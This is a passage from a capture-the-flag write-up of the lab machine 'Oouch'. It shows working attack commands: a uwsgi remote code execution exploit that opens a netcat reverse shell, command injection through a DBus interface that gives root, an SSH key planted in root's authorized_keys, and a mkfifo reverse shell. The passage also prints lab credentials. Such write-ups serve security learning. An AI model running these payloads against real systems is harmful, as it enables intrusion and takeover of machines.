class="string">&#x27;http://authorization.oouch.htb:8000/api/get_ssh?access_token=W4c7YMFgb3lrZLyfdYOMyxs3Fh89is&#x27;</span> -H <span class="string">&#x27;Cookie: sessionid=6lqzd97bobc8is2tl3xod702qnzondvb&#x27;</span> -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 2708</span><br><span class="line">Vary: Authorization, Cookie</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;ssh_server&quot;</span>: <span class="string">&quot;consumer.oouch.htb&quot;</span>, <span class="string">&quot;ssh_user&quot;</span>: <span class="string">&quot;qtc&quot;</span>, <span class="string">&quot;ssh_key&quot;</span>: <span class="string">&quot;-----BEGIN OPENSSH PRIVATE KEY-----\nb3Bl[...]QIDBA==\n-----END OPENSSH PRIVATE KEY-----&quot;</span>&#125;% </span><br></pre></td></tr></table></figure><p>Bingo! Let’s save it to file and try to login to the server using it on <code>qtc</code> account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i qtcssh qtc@oouch.htb</span><br><span class="line">Linux oouch 4.19.0-8-amd64 <span class="comment">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64</span></span><br><span class="line">Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3</span><br><span class="line">qtc@oouch:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">qtc@oouch:~$ cat user.txt</span><br><span class="line">axxxxxxxxxxxxxxxxxxxxxxxxxxx5</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p><code>qtc</code> home folder contains a <code>note.txt</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:~$ cat .note.txt</span><br><span class="line">Implementing an IPS using DBus and iptables == Genius?</span><br></pre></td></tr></table></figure><p>As a reminder an <code>IPS</code> stand for Intrusion detection system, <code>iptables</code> is a firewall and <code>DBus</code> , according to its website:</p><blockquote><p>D-Bus is a message bus system, a simple way for applications to talk to  one another. In addition to interprocess communication, D-Bus helps  coordinate process lifecycle; it makes it simple and reliable to code a  “single instance” application or daemon, and to launch applications and  daemons on demand when their services are needed. </p><p><a href="https://www.freedesktop.org/wiki/Software/dbus/">https://www.freedesktop.org/wiki/Software/dbus/</a></p></blockquote><p>I don’t know if it’s genius but definitely an original idea. Let’s move on.</p><h3 id="Accessing-Docker-Container"><a href="#Accessing-Docker-Container" class="headerlink" title="Accessing Docker Container"></a>Accessing Docker Container</h3><p>Another thing that catch the attention while doing recon is that we are hosting docker containers:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:~$ docker -v</span><br><span class="line">Docker version 19.03.5, build 633a0ea838</span><br><span class="line">qtc@oouch:~$ systemctl is-active docker</span><br><span class="line">active</span><br><span class="line">qtc@oouch:~$ ip a</span><br><span class="line">[...]</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default</span><br><span class="line">    link/ether 02:42:14:f2:20:5f brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: br-cc6c78e0c7d0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:c6:0b:4e:e1 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:c6ff:fe0b:4ee1/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Probably used for hosting the Oouch apps. </p><p>Since we don’t belongs to group <code>docker</code> we can not access the containers this way. But we do have the <code>qtc</code> SSH keys, maybe we can connect to the containers using it.</p><p>We know that <code>docker</code> is running on <code>172.17.0.1/16</code> subnet and <code>172.18.0.1/16</code> let’s try to connect to one. </p><p>Manually  trying to connect with <code>qtc</code> on <code>172.17.0.1/16</code> doesn’t give any results, but on <code>172.18.0.1/16</code> we manage to connect on <code>172.18.0.5</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:~$ ssh -i ~/.ssh/id_rsa qtc@172.18.0.5</span><br><span class="line">The authenticity of host <span class="string">&#x27;172.18.0.5 (172.18.0.5)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:ROF4hYtv6efFf0CQ80jfB60uyDobA9mVYiXVCiHlhSE.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>172.18.0.5<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Linux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">qtc@aeb4525789d8:~$</span></span><br></pre></td></tr></table></figure><p>Browsing through the docker container we stumbled across the source code of the consumer app, alongside some interesting informations like the database password:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:~$ <span class="built_in">cd</span> /code</span><br><span class="line">qtc@aeb4525789d8:/code$ ls</span><br><span class="line">Dockerfile       config.py    key         nginx.conf  requirements.txt  urls.txt</span><br><span class="line">authorized_keys  consumer.py  migrations  oouch       start.sh          uwsgi.ini</span><br><span class="line">qtc@aeb4525789d8:/code$ cat config.py</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line">class Config(object):</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql://qtc:clarabibi2019!@database.consumer.oouch.htb/Consumer&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = False</span><br><span class="line"></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) or <span class="string">&#x27;klarabubuklarabubuklarabubuklarabubu&#x27;</span></span><br></pre></td></tr></table></figure><p>Let’s keep this information in mind for later, it will probably come useful. </p><p>Another interesting fact is that the app is running on <code>uwsgi</code>:</p><blockquote><p>uWSGI is a software application that “aims at developing a full stack for building hosting services”. It is named after the Web Server Gateway Interface (WSGI), which was the first plugin supported by the project.</p><p>uWSGI is often used for serving Python web applications in conjunction with web servers such as Cherokee and Nginx, which offer direct support for uWSGI’s native uwsgi protocol.</p><p><a href="https://uwsgi-docs.readthedocs.io/en/latest/">https://uwsgi-docs.readthedocs.io/en/latest/</a></p></blockquote><p>Its configuration is also available in the folder:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/code$ cat uwsgi.ini</span><br><span class="line">[uwsgi]</span><br><span class="line">module = oouch:app</span><br><span class="line">uid = www-data</span><br><span class="line">gid = www-data</span><br><span class="line">master = <span class="literal">true</span></span><br><span class="line">processes = 10</span><br><span class="line">socket = /tmp/uwsgi.socket</span><br><span class="line">chmod-sock = 777</span><br><span class="line">vacuum = <span class="literal">true</span></span><br><span class="line">die-on-term = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">qtc@aeb4525789d8:/code$ cat start.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">service ssh start</span><br><span class="line">service nginx start</span><br><span class="line">uwsgi --ini uwsgi.ini --chmod-sock=666</span><br></pre></td></tr></table></figure><p>So far it’s not very useful. Let’s continue our recon.</p><h3 id="DBus-htb-oouch-Block-Interface"><a href="#DBus-htb-oouch-Block-Interface" class="headerlink" title="DBus htb.oouch.Block Interface"></a>DBus htb.oouch.Block Interface</h3><p>While checking for the reason the contact page got SSRF in <code>oouch/route.py</code> I stumbled upon <code>DBus</code> logic:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">contact</span>():</span></span><br><span class="line">    [...]</span><br><span class="line">    <span class="keyword">if</span> primitive_xss.search(form.textfield.data):</span><br><span class="line">        bus = dbus.SystemBus()</span><br><span class="line">        block_object = bus.get_object(<span class="string">&#x27;htb.oouch.Block&#x27;</span>, <span class="string">&#x27;/htb/oouch/Block&#x27;</span>)</span><br><span class="line">        block_iface = dbus.Interface(block_object, dbus_interface=<span class="string">&#x27;htb.oouch.Block&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        client_ip = request.environ.get(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>, request.remote_addr)</span><br><span class="line">        response = block_iface.Block(client_ip)</span><br><span class="line">        bus.close()</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;hacker.html&#x27;</span>, title=<span class="string">&#x27;Hacker&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> It’s very probably the <code>IPS</code> that the admin was talking about on his <code>note.txt</code>. If an XSS attempt is detected in the message body, a message containing the user IP is sent trough the <code>htb.oouch.Block</code> interface. Then the user gets redirected to an <code>hacker.html</code> page. Following the <code>note.txt</code> we can guess that a <code>DBus</code> server is running somewhere and adding the IP addresses received as messages through the <code>htb.oouch.Block</code> to an <code>iptables</code> denylist.</p><p>As far as I understand it’s actually a smart idea since it allows a -somewhat- secure communication between the docker container and the host.</p><p>Let’s see if we can find more informations about this <code>DBus</code> server.</p><p>Trying to manually send <code>dbus</code> message return an error message explaining we don’t have the correct rights to send messages.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/code$ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block <span class="string">&quot;string:test&quot;</span></span><br><span class="line">Error org.freedesktop.DBus.Error.AccessDenied: Rejected send message, 1 matched rules; <span class="built_in">type</span>=<span class="string">&quot;method_call&quot;</span>, sender=<span class="string">&quot;:1.748&quot;</span> (uid=1000 pid=6614 comm=<span class="string">&quot;dbus-send --system --print-reply --dest=htb.oouch.&quot;</span>) interface=<span class="string">&quot;htb.oouch.Block&quot;</span> member=<span class="string">&quot;Block&quot;</span> error name=<span class="string">&quot;(unset)&quot;</span> requested_reply=<span class="string">&quot;0&quot;</span> destination=<span class="string">&quot;htb.oouch.Block&quot;</span> (uid=0 pid=2572 comm=<span class="string">&quot;/root/dbus-server &quot;</span>)</span><br></pre></td></tr></table></figure><p>Going back to the docker host we find the config file related to the DBus <code>htb.oouch.Block</code> Interface:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:~$ cat /etc/dbus-1/system.d/htb.oouch.Block.conf</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt; &lt;!-- -*- XML -*- --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE busconfig PUBLIC</span><br><span class="line"> <span class="string">&quot;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&quot;</span></span><br><span class="line"> <span class="string">&quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;busconfig&gt;</span><br><span class="line"></span><br><span class="line">    &lt;policy user=<span class="string">&quot;root&quot;</span>&gt;</span><br><span class="line">        &lt;allow own=<span class="string">&quot;htb.oouch.Block&quot;</span>/&gt;</span><br><span class="line">    &lt;/policy&gt;</span><br><span class="line"></span><br><span class="line">        &lt;policy user=<span class="string">&quot;www-data&quot;</span>&gt;</span><br><span class="line">                &lt;allow send_destination=<span class="string">&quot;htb.oouch.Block&quot;</span>/&gt;</span><br><span class="line">                &lt;allow receive_sender=<span class="string">&quot;htb.oouch.Block&quot;</span>/&gt;</span><br><span class="line">        &lt;/policy&gt;</span><br><span class="line"></span><br><span class="line">&lt;/busconfig&gt;</span><br></pre></td></tr></table></figure><p>We can understand from the configs files we found so far that the app inside the container is communicating with its host and that only <code>www-data</code> is allowed to communicate on this channel.</p><p>We need to find a way to pivot to <code>www-data</code> in order to send command through DBus interface. This should also allows us to run command on host as <code>root</code>.</p><h3 id="Pivot-qtc-gt-docker-www-data"><a href="#Pivot-qtc-gt-docker-www-data" class="headerlink" title="Pivot qtc -&gt; docker www-data"></a>Pivot qtc -&gt; docker www-data</h3><p>If you remember <code>uwsgi.ini</code> config file, we know that <code>uwsgi.ini</code> is running as <code>www-data</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/code$ cat uwsgi.ini</span><br><span class="line">[uwsgi]</span><br><span class="line">module = oouch:app</span><br><span class="line">uid = www-data</span><br><span class="line">gid = www-data</span><br><span class="line">master = <span class="literal">true</span></span><br><span class="line">processes = 10</span><br><span class="line">socket = /tmp/uwsgi.socket</span><br><span class="line">chmod-sock = 777</span><br><span class="line">vacuum = <span class="literal">true</span></span><br><span class="line">die-on-term = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>Searching online lead us to a neat <a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py">vulnerability leading to Remote Code Execution in <code>uwsgi</code></a>. Let’s give it a try!</p><p>First we need to download it on our machine, then transfer it to the box and finally send it to the docker container. To ease to exploit process we are also going to transfer our <code>netcat</code> binary since it’s not installed on the container:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py</span><br><span class="line">[hg8@archbook ~]$ scp -i qtcssh uwsgi_exp.py qtc@oouch.htb:/tmp/.hg8</span><br><span class="line">uwsgi_exp.py    100%  124KB  89.7KB/s   00:01</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:/tmp/.hg8$ cp /bin/nc .</span><br><span class="line">qtc@oouch:/tmp/.hg8$ scp -i ~/.ssh/id_rsa uwsgi_exp.py qtc@172.18.0.5:/tmp</span><br><span class="line">uwsgi_exp.py    100%  124KB  73.8MB/s   00:00</span><br><span class="line">qtc@oouch:/tmp/.hg8$ scp -i ~/.ssh/id_rsa nc qtc@172.18.0.5:/tmp</span><br><span class="line">nc     100%   27KB  22.8MB/s   00:00</span><br></pre></td></tr></table></figure><p>The exploit can be run using HTTP, TCP or Unix socket mode. Let’s use the socket mode since the <code>uwsgi.ini</code> told us where it’s stored (<code>/tmp/uwsgi.socket</code>):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:/tmp/.hg8$ ssh -i ~/.ssh/id_rsa qtc@172.18.0.5</span><br><span class="line">Linux aeb4525789d8 4.19.0-8-amd64 <span class="comment">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64</span></span><br><span class="line"></span><br><span class="line">Last login: Fri May 15 13:11:04 2020 from 172.18.0.1</span><br><span class="line">qtc@aeb4525789d8:~$ ls /tmp/</span><br><span class="line">nc  uwsgi.socket  uwsgi_exp.py</span><br></pre></td></tr></table></figure><p>Let’s open our listener on <code>qtc</code> host:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:/$ nc -nlvp 8585</span><br><span class="line">listening on [any] 8585 ...</span><br></pre></td></tr></table></figure><p> And run the exploit:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:~$ <span class="built_in">cd</span> /tmp/</span><br><span class="line">qtc@aeb4525789d8:/tmp$ python uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c <span class="string">&quot;/tmp/nc -e /bin/bash 172.18.0.1 8585&quot;</span></span><br><span class="line">[*]Sending payload.</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;uwsgi_exp.py&quot;</span>, line 146, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    main()</span><br><span class="line">  File <span class="string">&quot;uwsgi_exp.py&quot;</span>, line 143, <span class="keyword">in</span> main</span><br><span class="line">    <span class="built_in">print</span>(curl(args.mode.lower(), args.uwsgi_addr, payload, <span class="string">&#x27;/testapp&#x27;</span>))</span><br><span class="line">  File <span class="string">&quot;uwsgi_exp.py&quot;</span>, line 110, <span class="keyword">in</span> curl</span><br><span class="line">    <span class="built_in">return</span> ask_uwsgi(addr_and_port, mode, var)</span><br><span class="line">  File <span class="string">&quot;uwsgi_exp.py&quot;</span>, line 77, <span class="keyword">in</span> ask_uwsgi</span><br><span class="line">    s.send(pack_uwsgi_vars(var) + body.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">  File <span class="string">&quot;uwsgi_exp.py&quot;</span>, line 26, <span class="keyword">in</span> pack_uwsgi_vars</span><br><span class="line">    pk += sz(k) + k.encode(<span class="string">&#x27;utf8&#x27;</span>) + sz(v) + v.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">  File <span class="string">&quot;uwsgi_exp.py&quot;</span>, line 18, <span class="keyword">in</span> sz</span><br><span class="line">    <span class="keyword">if</span> sys.version_info[0] == 3: import bytes</span><br><span class="line">ModuleNotFoundError: No module named <span class="string">&#x27;bytes&#x27;</span></span><br></pre></td></tr></table></figure><p>Since we are using Python 3 let’s tweak the exploit a little to make it compatible:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- if sys.version_info[0] == 3: import bytes</span></span><br><span class="line"><span class="deletion">- s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="addition">+ s = bytes.fromhex(s)</span></span><br></pre></td></tr></table></figure><p>And we can run it again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/tmp$ python uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c <span class="string">&quot;/tmp/nc -e /bin/bash 172.18.0.1 8585&quot;</span></span><br><span class="line">[*]Sending payload.</span><br></pre></td></tr></table></figure><p>A new connection appear on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:/tmp/.hg8$ nc -nlvp 8585</span><br><span class="line">listening on [any] 8585 ...</span><br><span class="line">connect to [172.18.0.1] from (UNKNOWN) [172.18.0.5] 40206</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><h3 id="DBus-privilege-escalation"><a href="#DBus-privilege-escalation" class="headerlink" title="DBus privilege escalation"></a>DBus privilege escalation</h3><p>Alright we are now connect as <code>www-data</code>, we should be able to freely send <code>dbus</code> message on the <code>htb.oouch.Block</code> interface. We know that the <code>dbus</code> server is used to add <code>iptable</code> entries with the IP sent as <code>Block</code> object. Knowing this we can imagine the <code>dbus</code> server is running this kind of command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s &#123;IP&#125; -j DROP</span><br></pre></td></tr></table></figure><p>So maybe if the message is not properly sanitized we can achieved remote code execution ? For example sending the following command injection payload: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;touch /tmp/pwnd;</span><br></pre></td></tr></table></figure><p>Will result in the following command being run:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s ;touch /tmp/pwnd; -j DROP</span><br></pre></td></tr></table></figure><p>Well, here is the theory so now let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@aeb4525789d8:/$ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block <span class="string">&quot;string:;/bin/touch /tmp/pwnd;&quot;</span></span><br><span class="line">method <span class="built_in">return</span> time=1589554703.938058 sender=:1.3 -&gt; destination=:1.1037 serial=7 reply_serial=2</span><br><span class="line">  string <span class="string">&quot;Carried out :D&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:/$ ls -l /tmp/pwnd</span><br><span class="line">-rw-r--r-- 1 root root 0 May 15 21:38 /tmp/pwnd</span><br></pre></td></tr></table></figure><p>Awesome it worked! Let’s now use the Remote Code Execution vulnerability to get a <code>root</code> shell. </p><h4 id="Method-1-SSH-authorized-keys"><a href="#Method-1-SSH-authorized-keys" class="headerlink" title="Method 1: SSH authorized_keys"></a>Method 1: SSH authorized_keys</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@aeb4525789d8:/$ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block <span class="string">&quot;string:;/bin/echo \&quot;ssh-rsa AAA[...]2E= hg8@htb.htb\&quot; &gt;&gt; /root/.ssh/authorized_keys;&quot;</span></span><br></pre></td></tr></table></figure><p>Then login using SSH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb root@oouch.htb</span><br><span class="line">Linux oouch 4.19.0-8-amd64 <span class="comment">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64</span></span><br><span class="line"></span><br><span class="line">Last login: Tue Feb 25 12:54:48 2020</span><br><span class="line">root@oouch:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@oouch:~<span class="comment"># cat root.txt</span></span><br><span class="line">cxxxxxxxxxxxxxxxxxxx3</span><br><span class="line">root@oouch:~<span class="comment">#</span></span><br></pre></td></tr></table></figure><h4 id="Method-2-Bi-directional-netcat"><a href="#Method-2-Bi-directional-netcat" class="headerlink" title="Method 2: Bi-directional netcat"></a>Method 2: Bi-directional netcat</h4><p>This one was new to me. First let’s open our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/tmp$ /tmp/nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure><p>Then let’s inject a bi-directional <code>netcat</code> shell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@aeb4525789d8:/$ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block <span class="string">&quot;string:;mkfifo /tmp/.h; cat /tmp/.h | /bin/bash -i 2&gt;&amp;1 | nc 172.18.0.5 4444 &gt;/tmp/.h;&quot;</span></span><br><span class="line">&lt;| /bin/bash -i 2&gt;&amp;1 | nc 172.18.0.5 4444 &gt;/tmp/.h;<span class="string">&quot;</span></span><br><span class="line"><span class="string">method return time=1589553952.221350 sender=:1.3 -&gt; destination=:1.999 serial=3 reply_serial=2</span></span><br><span class="line"><span class="string">   string &quot;</span>Carried out :D<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>We get the connection on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/tmp$ /tmp/nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [172.18.0.5] from (UNKNOWN) [172.18.0.1] 41738</span><br><span class="line">root@oouch:/root<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@oouch:/root<span class="comment"># cat root.txt</span></span><br><span class="line">cxxxxxxxxxxxxxxxxxxx3</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Beyond-root"><a href="#Beyond-root" class="headerlink" title="Beyond root"></a>Beyond root</h2><p>On root home folder we found the following <code>credits.txt</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@oouch:~<span class="comment"># cat credits.txt</span></span><br><span class="line">This machine was created with the <span class="built_in">help</span> of the following tutorials:</span><br><span 